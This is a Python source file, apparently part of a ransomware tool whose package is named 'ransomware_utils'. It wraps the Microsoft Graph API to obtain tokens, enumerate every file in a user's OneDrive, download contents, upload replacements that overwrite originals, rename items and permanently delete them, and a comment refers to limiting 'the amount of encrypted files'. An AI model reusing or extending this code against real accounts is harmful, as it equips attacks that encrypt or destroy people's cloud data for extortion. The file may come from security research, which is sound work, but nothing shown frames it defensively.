from ransomware_utils.onedrive_objects import *
import requests
import re
import os


class MicrosoftGraphAPI:
    def __init__(self) -> None:
        self.__drive_id = None
        self.__http_session = requests.Session()

    def __item_json_to_onedrive_item(self, item_json: dict) -> OneDriveItem:
        parent_path = item_json["parentReference"]["path"].split('/root:/')[-1]
        parent_id = item_json["parentReference"]["id"]
        item_name = item_json["name"]
        item_id = item_json["id"]
        item_path = f"{parent_path}/{item_name}"

        if item_json.get("file", None) is not None:
            onedrive_item = OneDriveFileItem(item_path, parent_id, item_id)
        elif item_json.get("folder", None) is not None:
            onedrive_item = OneDriveFolderItem(item_path, parent_id, item_id)
        elif item_json.get("package", None) is not None:
            onedrive_item = OneDrivePackageItem(item_path, parent_id, item_id)
        else:
            raise RuntimeError("OneDrive element type is unfamiliar")

        return onedrive_item

    def __set_token(self, token):
        self.__session_token = token
        self.__http_session.headers.update({"Authorization": f"Bearer {self.__session_token}"})

    def __safe_http_request(self, *args, **kwargs) -> requests.Response:
        return self.__http_session.request(*args, **kwargs)

    def __create_folder(self, parent_folder_id: str, req_data: dict):
        response = self.__safe_http_request("POST", f"https://graph.microsoft.com/v1.0/drives/{self.__drive_id}/items/{parent_folder_id}/children", json=req_data)
        if response.status_code in [201, 409]:
            return response.json().get("id")
        else:
            print(f"Failed to create folder '{req_data['id']}'. Status code: {response.status_code}")
            print(response.text)
            return None

    def __upload_file_content(self, onedrive_file_path: str, file_content: bytes, req_data: dict):
        onedrive_file_path = re.match(r"^[\\]*(.*)$", onedrive_file_path).group(1)
        response = self.__safe_http_request("POST", f"https://graph.microsoft.com/v1.0/drives/{self.__drive_id}/items/root:/{onedrive_file_path}:/createUploadSession",
                                       json=req_data)
        res_json = response.json()
        upload_url = res_json.get("uploadUrl")
        if not upload_url:
            print(f"Couldn't upload file to {onedrive_file_path}")
            return

        full_file_size = len(file_content)
        file_content = file_content
        chunk_size = 327680  # 320 KB (adjust as needed)
        current_byte = 0

        response = None
        while len(file_content) > 0:
            chunk = file_content[:chunk_size]
            file_content = file_content[chunk_size:]

            response = self.__safe_http_request("PUT", upload_url, data=chunk, headers={
                "Content-Range": f"bytes {current_byte}-{current_byte + len(chunk) - 1}/{full_file_size}"})
            current_byte = current_byte + len(chunk)

        if response.status_code not in [200, 201, 202]:
            print(f"Upload failed with status code {response.status_code}")

    def __delete_item_by_id(self, item_id):
        self.__safe_http_request("DELETE", f"https://graph.microsoft.com/v1.0/drives/{self.__drive_id}/items/{item_id}")

    def __get_item_parent_id(self, item_id):
        response = self.__safe_http_request("GET", f"https://graph.microsoft.com/v1.0/drives/{self.__drive_id}/items/{item_id}")
        if response.status_code == 200:
            root_folder_id = response.json()["parentReference"].get('id')
            return root_folder_id
        else:
            print(f"Failed to get root folder ID. Status code: {response.status_code}")
            print(response.text)
            return None

    def __permanent_delete_item_by_id(self, item_id):
        self.__safe_http_request("POST", f"https://graph.microsoft.com/v1.0/drives/{self.__drive_id}/items/{item_id}/permanentDelete")

    def __get_root_folder_id(self):
        response = self.__safe_http_request("GET", f"https://graph.microsoft.com/v1.0/drives/{self.__drive_id}/root")
        if response.status_code == 200:
            root_folder_id = response.json().get("id")
            return root_folder_id
        else:
            print(f"Failed to get root folder ID. Status code: {response.status_code}")
            print(response.text)
            return None

    def __get_folder_id_by_path(self, path):
        response = self.__safe_http_request("GET", f"https://graph.microsoft.com/v1.0/drives/{self.__drive_id}{'/root:/' + path if path else '/root'}")
        if response.status_code == 200:
            root_folder_id = response.json().get("id")
            return root_folder_id
        else:
            print(f"Failed to get folder ID by path. Status code: {response.status_code}")
            print(response.text)
            return None

    def generate_access_token(self, tenant_id, client_id, client_secret):
        # Example using requests library and basic authentication (not recommended for production)
        token_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
        token_data = {
            "grant_type": "client_credentials",
            "client_id": client_id,
            "client_secret": client_secret,
            "scope": "https://graph.microsoft.com/.default",
        }
        token_response = requests.post(token_endpoint, data=token_data)
        access_token = token_response.json().get("access_token")
        return access_token

    def get_user_id(self, username):
        response = self.__safe_http_request('GET', f"https://graph.microsoft.com/v1.0/users?$filter=userPrincipalName eq '{username}'")

        if response.status_code == 200:
            user_data = response.json().get("value")
            if user_data and len(user_data) > 0:
                user_id = user_data[0].get("id")
                return user_id
            else:
                print(f"User '{username}' not found.")
                return None
        else:
            print(f"Failed to get user ID. Status code: {response.status_code}")
            print(response.text)
            return None

    def login_using_token(self, token: str):
        self.__set_token(token)

    def get_token(self):
        return self.__session_token

    def rename_item(self, onedrive_item: OneDriveItem, new_name: str) -> OneDriveItem:
        params = {
            "@name.conflictBehavior": "replace",
            "name": new_name,
            "select": "*, path"
        }
        res = self.__safe_http_request("PATCH", f"https://graph.microsoft.com/v1.0/drives/{self.__drive_id}/items/{onedrive_item.id}",
                                       json=params)
        return self.__item_json_to_onedrive_item(res.json())

    def set_user_drive_id(self, user_id):
        if self.__drive_id is not None:
            return self.__drive_id

        res = self.__safe_http_request("GET", f"https://graph.microsoft.com/v1.0/users/{user_id}/drive")
        self.__drive_id = res.json()["id"]

        return self.__drive_id

    def get_item_by_path(self, item_path: str) -> OneDriveItem:
        if "/" != item_path:
            onedrive_parent_item = self.get_item_by_path(os.path.dirname(item_path))
            path_parent_children = self.list_children(onedrive_parent_item)
            path_basename = os.path.basename(item_path)
            for child_onedrive_item in path_parent_children:
                if path_basename == child_onedrive_item.name:
                    return child_onedrive_item
            raise RuntimeError("Could not find OneDrive item")
        else:
            return self.get_root_folder_item()

    def read_shared_file_content(self, onedrive_drive_id: str, onedrive_item_id: str, auth_key: str) -> bytes:
        req_data = {
            "select": "id,@content.downloadUrl",
            "authkey": auth_key,
        }

        res = self.__safe_http_request("GET",
                                       f"https://api.onedrive.com/v1.0/drives/{onedrive_drive_id}/items/{onedrive_item_id}",
                                       params=req_data)
        res = self.__safe_http_request("GET", res.json()["@content.downloadUrl"])
        return res.content

    def read_file_content(self, onedrive_item: OneDriveFileItem) -> bytes:
        req_data = {"select": "@content.downloadUrl"}
        res = self.__safe_http_request("GET", f"https://graph.microsoft.com/v1.0/drives/{self.__drive_id}/items/{onedrive_item.id}",
                                       json=req_data)
        res = self.__safe_http_request("GET", res.json()["@microsoft.graph.downloadUrl"])
        return res.content

    def create_file(self, onedrive_file_path: str, file_content: bytes):
        req_data = {"item": {"@microsoft.graph.conflictBehavior": "replace"}}
        self.__upload_file_content(onedrive_file_path, file_content, req_data)

    def create_folder(self, folder_name: str, parent_folder_id: str, modify_if_exists: bool = True):
        conflict_behavior = "rename" if modify_if_exists else "fail"
        req_data = {"@microsoft.graph.conflictBehavior": conflict_behavior, 'name': folder_name, 'folder': {}}
        return self.__create_folder(parent_folder_id, req_data)

    # def modify_file_content(self, onedrive_item: OneDriveFileItem, new_content: bytes):
    #     req_data = {"item": {"@microsoft.graph.conflictBehavior": "replace"}, "deferCommit": True}
    #     self.__upload_file_content(onedrive_item.full_path, new_content, req_data)

    def delete_item(self, onedrive_item: OneDriveItem):
        self.__delete_item_by_id(onedrive_item.id)

    def permanent_delete_item(self, onedrive_item: OneDriveItem):
        self.__permanent_delete_item_by_id(onedrive_item.id)

    def get_root_folder_item(self) -> OneDriveFolderItem:
        return OneDriveFolderItem("/", None, "root")

    def get_folder_item(self, path) -> OneDriveFolderItem:
        folder_id = self.get_folder_id_by_path(path)
        parent_id = self.__get_item_parent_id(folder_id)
        return OneDriveFolderItem(path, parent_id, folder_id)

    def get_root_folder_id(self) -> OneDriveFolderItem:
        return self.__get_root_folder_id()

    def get_folder_id_by_path(self, path) -> str:
        return self.__get_folder_id_by_path(path)

    def list_children(self, onedrive_folder: OneDriveFolderItem) -> list[OneDriveItem]:
        req_params = {
            "$top": 100, # possible argument for limiting the amount of encrypted files
            "$select": "*,ocr,webDavUrl,sharepointIds,isRestricted,commentSettings,specialFolder"
        }

        children_list = []
        next_page_request_url = f"https://graph.microsoft.com/v1.0/drives/{self.__drive_id}/items/{onedrive_folder.id}/children"
        root_page_request_url = f"https://graph.microsoft.com/v1.0/drives/{self.__drive_id}/root/children"
        while next_page_request_url:
            try:
                res = self.__safe_http_request("GET", next_page_request_url, json=req_params)
            except Exception as e:
                try:
                    res = self.__safe_http_request("GET", root_page_request_url, json=req_params)
                except Exception as e:
                    raise RuntimeError("Token is invalid for operation, or operation is invalid")

            res_json = res.json()
            res_children_list = res_json["value"]
            next_page_request_url = res_json.get("@odata.nextLink", None)

            for child_element in res_children_list:
                onedrive_item = self.__item_json_to_onedrive_item(child_element)
                children_list.append(onedrive_item)

        return children_list

    def list_children_recursively(self, onedrive_folder_item: OneDriveFolderItem) -> list[OneDriveItem]:
        all_children_items = []
        first_level_children = self.list_children(onedrive_folder_item)

        all_children_items.extend(first_level_children)
        for onedrive_child_item in first_level_children:
            if isinstance(onedrive_child_item, OneDriveFolderItem):
                all_children_items.extend(self.list_children_recursively(onedrive_child_item))

        return all_children_items

